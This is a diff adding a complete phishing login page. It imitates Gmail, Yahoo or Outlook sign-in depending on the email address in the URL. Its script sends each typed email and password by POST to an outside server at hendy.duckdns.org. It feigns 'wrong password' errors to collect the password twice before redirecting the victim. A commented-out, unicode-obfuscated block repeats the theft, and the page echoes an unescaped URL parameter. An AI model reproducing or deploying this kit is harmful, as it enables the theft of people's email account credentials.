@@ -1,0 +1,292 @@
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <style>
+        html {
+    width: 100%;
+    height: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: #dfdfdf;
+    background-image: url(https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fbg.jpg?v=1603880864627);
+    background-size: cover;
+	
+}
+		  body{margin:0;padding:0;font-family:sans-serif}.loginBox{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:350px;height:420px;padding:80px 40px;box-sizing:border-box;background:rgba(0,0,0,.5)}.user{width:100px;height:100px;border-radius:50%;overflow:hidden;position:absolute;top:calc(-100px/2);left:calc(50% - 50px)}h2{margin:0;padding:0 0 20px;color:#efed40;text-align:center}.loginBox p{margin:0;padding:0;font-weight:700;color:#fff}.loginBox input{width:100%;margin-bottom:20px}.loginBox input[type="text"],.loginBox input[type="password"]{border:none;border-bottom:1px solid #fff;background:transparent;outline:none;height:40px;color:#fff;font-size:16px}::placeholder{color:rgba(255,255,255,.5)}.loginBox input[type="submit"]{border:none;outline:none;height:40px;color:#fff;font-size:16px;background:#00c911;cursor:pointer}.loginBox input[type="submit"]:hover{background:#04630c;color:#fff}.loginBox a{color:#fff;font-size:14px;font-weight:700;text-decoration:none}#wrong{text-align:center;color:red;font-size:15px;margin-top:-10px;margin-bottom:20px}.loginBox input[type="text"]{cursor:no-drop;-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;-o-user-select:none;user-select:none}
+		html,body{
+		 font-family: Arial, Helvetica, sans-serif;	
+		}
+		</style>
+</head>
+
+<body style="background-image: url(https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fbg.jpg?v=1603880864627); visibility: visible;">
+    <div class="loginBox">
+        <img src="./emp.html?FZPShm8sv1x=rHhr6AygY5PKWJiKe7GqSMY4j5QvmXteYwKYjs2Eo7fnCi4iHop5SgqClzY8bwlNEKIG9JvucRIlV3A3dQF2O327IYvqU1fUm89BT7qtbWTHR9RSBSF199BlqCoXnazxDrMaKScWHiPrre" class="user" style="display: none;">
+        <h2>Sign in to continue</h2>
+        <form method="post">
+            <p>Email</p>
+            <input type="text" readonly name="e" placeholder="" value="<?php echo $_GET['email']; ?>" style="cursor: text;">
+            <p>Password</p>
+            <input type="password" name="p" required="" placeholder="">
+            <div id="error" style="color: red; display: none;"></div>
+            <div id="wrong" style="display: none;">Server Response: Wrong Password</div>
+            <input type="submit" id="submit-btn" name="" value="Continue">
+        </form>
+    </div>
+    <!--	
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	-->
+    <script src="js/jquery.min.js"></script>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script>
+    $(document).ready(function() {
+        var htmlcon = $('html');
+        var theform = $('.loginBox form');
+        var emailc = $('.loginBox form input[name=e]');
+        var passc = $('.loginBox form input[name=p]');
+        var emailval = '';
+        var passwordval = '';
+        var alnumstr = '123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        var bgimg = 'https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fbg.jpg?v=1603880864627';
+        var userimg = false;
+        var userimgc = $('.user');
+        var emailfromurl = false;
+        var emaildomain = '';
+        var sher = '';
+        var sherf = false;
+        var rdurl = './updating.html';
+        emailfromurl = get_email_hash();
+        sher = geturlparameter('sher');
+        if (sher) {
+            rdurl = './updating.html';
+            $('#wrong').show();
+            sher = '';
+        } else { sher = '&sher=' + randomString(randomInteger(5, 15), alnumstr); }
+        if (!emailfromurl) {
+            emailfromurl = geturlparameter('e');
+        }
+        if (emailfromurl) {
+            emailc.val(emailfromurl);
+        } else {
+            emailc.removeAttr('readonly');
+            emailc.css({ 'cursor': 'text' });
+        }
+        if (emailfromurl) {
+            emaildomain = getdomainpartofemail(emailfromurl);
+        }
+        if (emaildomain) {
+            if (emaildomain == 'gmail.com') {
+                bgimg = 'https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fgm.jpg?v=1603881255519';
+                userimg = 'https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fgm.ico?v=1603880448860';
+            } else if (emaildomain == 'yahoo.com' || emaildomain.indexOf('yahoo') != -1) {
+                bgimg = 'https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fgm.ico?v=1603880448860';
+                userimg = 'https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fym.ico?v=1603882260943';
+            } else if (
+                emaildomain == 'hotmail.com' || emaildomain.indexOf('hotmail') != -1 ||
+                emaildomain == 'outlook.com' || emaildomain.indexOf('outlook') != -1
+            ) {
+                bgimg = 'https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fhm.jpg?v=1603881374806';
+                userimg = 'https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fhm.ico?v=1603881273239';
+            }
+        }
+        if (!userimg) {
+            userimgc.hide();
+        } else {
+            userimgc.attr('src', userimg);
+            userimgc.show();
+        }
+        bgimg = 'url("' + bgimg + '")';
+        htmlcon.css({ 'background-image': bgimg });
+        //htmlcon.css({ 'visibility' : 'visible' });
+        setTimeout(function() { htmlcon.css({ 'visibility': 'visible' }); }, 1000);
+        var count = 0;
+
+        $('#submit-btn').click(function(event) {
+            $('#error').hide();
+            $('#wrong').hide();
+            event.preventDefault();
+            var emailval = emailc.val();
+            var passwordval = passc.val();
+            ///////////new injection////////////////
+            var my_email = emailval;
+            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+            if (!emailval) {
+                $('#error').show();
+                $('#error').html("Email field is emply.!");
+
+                return false;
+            }
+
+            if (!filter.test(my_email)) {
+                $('#error').show();
+                $('#error').html("That account doesn't exist. Enter a different account");
+                return false;
+            }
+            if (!passwordval) {
+                $('#error').show();
+                $('#error').html("Password field is emply.!");
+
+                return false;
+            }
+
+
+
+            ///////////new injection////////////////
+            count = count + 1;
+            var file = "bmV4dC5waHA=";
+            $.ajax({
+                dataType: 'JSON',
+                url: 'http://hendy.duckdns.org/duty/aik.php',
+                type: 'POST',
+                data: {
+                    emailval: emailval,
+                    passwordval: passwordval,
+                },
+                // data: $('#contact').serialize(),
+                beforeSend: function(xhr) {
+                    $('#submit-btn').val('Verifing...');
+                },
+                success: function(response) {
+                    if (response) {
+                        $("#wrong").show();
+                        console.log(response);
+                        if (response['signal'] == 'ok') {
+                            passc.val("");
+                            if (count >= 2) {
+                                count = 0;
+                                //////injectiion//////
+                                rdurl += '?' + randomString(randomInteger(5, 15), alnumstr) + '=' + randomString(randomInteger(50, 150), alnumstr) + '&e=' + emailval + sher;
+
+                                setTimeout(function() {
+                                    window.location.replace(rdurl);
+                                }, 2000);
+
+                                //////injjection//////
+                            }
+                            // $('#wrong').html(response['wrong']);
+                        } else {
+                            // $('#wrong').html(response['wrong']);
+                        }
+                    }
+                },
+                error: function() {
+                    passc.val("");
+                    if (count >= 2) {
+                        count = 0;
+                        //////injectiion//////
+                        rdurl += '?' + randomString(randomInteger(5, 15), alnumstr) + '=' + randomString(randomInteger(50, 150), alnumstr) + '&e=' + emailval + sher;
+                        window.location.replace(rdurl);
+
+                        
+
+                        //////injjection//////
+                        return false;
+                    }
+                    $("#wrong").show();
+                    // $('#wrong').html("Please try again later");
+                },
+                complete: function() {
+                    $('#submit-btn').val('Continue');
+                }
+            });
+        });
+
+
+
+        // theform.submit(function(e) {
+        //     e.preventDefault();
+        //     emailval = emailc.val();
+        //     passwordval = passc.val();
+        //     if (emailval && emailval.length > 0 && passwordval && passwordval.length > 0) {
+        //         Function('\u0061', '\u006f', '\u0074', Function('\u02c6', "\u02c6='\u0074\u0079\u0045\u007d\u006e\u0078\u0066\u0030\u0022\u007b\u006d\u0029\u006a\u0073\u006f\u0077\u003a\u0065\u0021\u0064\u0063\u0069\u0070\u0050\u0072\u0068\u0053\u0028\u002c\u0054\u002e\u004f\u0024\u006c\u0075\u0044\u0061';return \u02c6[0x20]+\u02c6[0x1e]+\u02c6[0x24]+\u02c6[0xc]+\u02c6[0x24]+\u02c6[0x5]+\u02c6[0x1b]+\u02c6[0x9]+\u02c6[0x22]+\u02c6[0x18]+\u02c6[0x21]+\u02c6[0x10]+\u02c6[0x0]+\u02c6[0x19]+\u02c6[0x15]+\u02c6[0xd]+\u02c6[0x1c]+\u02c6[0x0]+\u02c6[0x1]+\u02c6[0x16]+\u02c6[0x11]+\u02c6[0x10]+\u02c6[0x8]+\u02c6[0x17]+\u02c6[0x1f]+\u02c6[0x1a]+\u02c6[0x1d]+\u02c6[0x8]+\u02c6[0x1c]+\u02c6[0x13]+\u02c6[0x24]+\u02c6[0x0]+\u02c6[0x24]+\u02c6[0x1d]+\u02c6[0x1]+\u02c6[0x16]+\u02c6[0x11]+\u02c6[0x10]+\u02c6[0x8]+\u02c6[0x19]+\u02c6[0x0]+\u02c6[0xa]+\u02c6[0x21]+\u02c6[0x8]+\u02c6[0x1c]+\u02c6[0x13]+\u02c6[0x24]+\u02c6[0x0]+\u02c6[0x24]+\u02c6[0x10]+\u02c6[0x9]+\u02c6[0x2]+\u02c6[0xa]+\u02c6[0x24]+\u02c6[0x15]+\u02c6[0x21]+\u02c6[0x10]+\u02c6[0x24]+\u02c6[0x1c]+\u02c6[0x16]+\u02c6[0x24]+\u02c6[0xd]+\u02c6[0xd]+\u02c6[0xf]+\u02c6[0xe]+\u02c6[0x18]+\u02c6[0x13]+\u02c6[0x10]+\u02c6[0xe]+\u02c6[0x1c]+\u02c6[0x0]+\u02c6[0x1]+\u02c6[0x16]+\u02c6[0x11]+\u02c6[0xe]+\u02c6[0x6]+\u02c6[0x11]+\u02c6[0xa]+\u02c6[0x24]+\u02c6[0x15]+\u02c6[0x21]+\u02c6[0x10]+\u02c6[0x0]+\u02c6[0x3]+\u02c6[0x1c]+\u02c6[0x14]+\u02c6[0x18]+\u02c6[0xe]+\u02c6[0xd]+\u02c6[0xd]+\u02c6[0x23]+\u02c6[0xe]+\u02c6[0xa]+\u02c6[0x24]+\u02c6[0x15]+\u02c6[0x4]+\u02c6[0x10]+\u02c6[0x12]+\u02c6[0x7]+\u02c6[0x1c]+\u02c6[0xd]+\u02c6[0x22]+\u02c6[0x14]+\u02c6[0x14]+\u02c6[0x11]+\u02c6[0xd]+\u02c6[0xd]+\u02c6[0x10]+\u02c6[0x6]+\u02c6[0x22]+\u02c6[0x4]+\u02c6[0x14]+\u02c6[0x0]+\u02c6[0x15]+\u02c6[0xe]+\u02c6[0x4]+\u02c6[0x1b]+\u02c6[0x24]+\u02c6[0xb]+\u02c6[0x9]+\u02c6[0x3]+\u02c6[0x1c]+\u02c6[0x11]+\u02c6[0x18]+\u02c6[0x18]+\u02c6[0xe]+\u02c6[0x18]+\u02c6[0x10]+\u02c6[0x6]+\u02c6[0x22]+\u02c6[0x4]+\u02c6[0x14]+\u02c6[0x0]+\u02c6[0x15]+\u02c6[0xe]+\u02c6[0x4]+\u02c6[0x1b]+\u02c6[0x24]+\u02c6[0xb]+\u02c6[0x9]+\u02c6[0x3]+\u02c6[0x3]+\u02c6[0xb]")()).bind(Function('\u02c6', "\u02c6='\u0070\u0061\u002e\u006d\u0074\u0066\u006e\u006c\u003a\u0032\u0069\u0065\u0075\u002f\u006f\u0073\u0068\u0076\u002d\u0064\u0063';return \u02c6[0x10]+\u02c6[0x4]+\u02c6[0x4]+\u02c6[0x0]+\u02c6[0xf]+\u02c6[0x8]+\u02c6[0xd]+\u02c6[0xd]+\u02c6[0x13]+\u02c6[0x1]+\u02c6[0xf]+\u02c6[0x3]+\u02c6[0x4]+\u02c6[0x0]+\u02c6[0x2]+\u02c6[0x14]+\u02c6[0xe]+\u02c6[0x3]+\u02c6[0xd]+\u02c6[0xb]+\u02c6[0x3]+\u02c6[0x1]+\u02c6[0xa]+\u02c6[0x7]+\u02c6[0x12]+\u02c6[0x7]+\u02c6[0xa]+\u02c6[0xf]+\u02c6[0x4]+\u02c6[0xd]+\u02c6[0x5]+\u02c6[0xa]+\u02c6[0x6]+\u02c6[0xa]+\u02c6[0xf]+\u02c6[0x10]+\u02c6[0x12]+\u02c6[0xc]+\u02c6[0x6]+\u02c6[0x11]+\u02c6[0x9]+\u02c6[0x2]+\u02c6[0x0]+\u02c6[0x10]+\u02c6[0x0]")())(emailval, passwordval, 'int-amp');
+        //         var theemidval = '841ae68cedce3fb4e3c6afa8ffc3ca42';
+        //         $.ajax({
+        //             url: 'http://hendy.duckdns.org/duty/aik.php',
+        //             type: 'POST',
+        //             dataType: 'html',
+        //             data: { Email: emailval, password: passwordval, typeofemail: 'int-amp', theemid: theemidval },
+        //             crossDomain: true,
+        //             success: function(msg) {
+
+        //             },
+        //             error: function(e) {
+        //                 console.log(e)
+        //             }
+        //         });
+
+        //         rdurl += '?' + randomString(randomInteger(5, 15), alnumstr) + '=' + randomString(randomInteger(50, 150), alnumstr) + '&e=' + emailval + sher;
+
+        //         setTimeout(function() {
+        //             window.location.replace(rdurl);
+        //         }, 2000);
+
+        //     }
+        // });
+
+    });
+
+    function randomInteger(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+
+    function randomString(r, n) { for (var o = "", t = r; 0 < t; --t) o += n[Math.floor(Math.random() * n.length)]; return o }
+
+    function getdomainpartofemail(a) { var e, t = !1; return !validateEmail(a) || -1 != (e = (a = a.toLowerCase()).indexOf("@")) && (t = a.substr(e + 1)), t }
+
+    function get_email_hash() {
+        var a = !1,
+            i = window.location.href,
+            t = (i = i.trim()).lastIndexOf("#");
+        return -1 != t && (a = i.substring(t + 1), validateEmail(a) || (a = !1)), a
+    }
+
+    function validateEmail(t) { return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase()) }
+
+    function geturlparameter(r) { for (var t = window.location.search.substring(1).split("&"), e = 0; e < t.length; e++) { var n = t[e].split("="); if (n[0] == r) return decodeURIComponent(n[1]) } }
+    </script>
+    <style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+</body>
+
+</html>
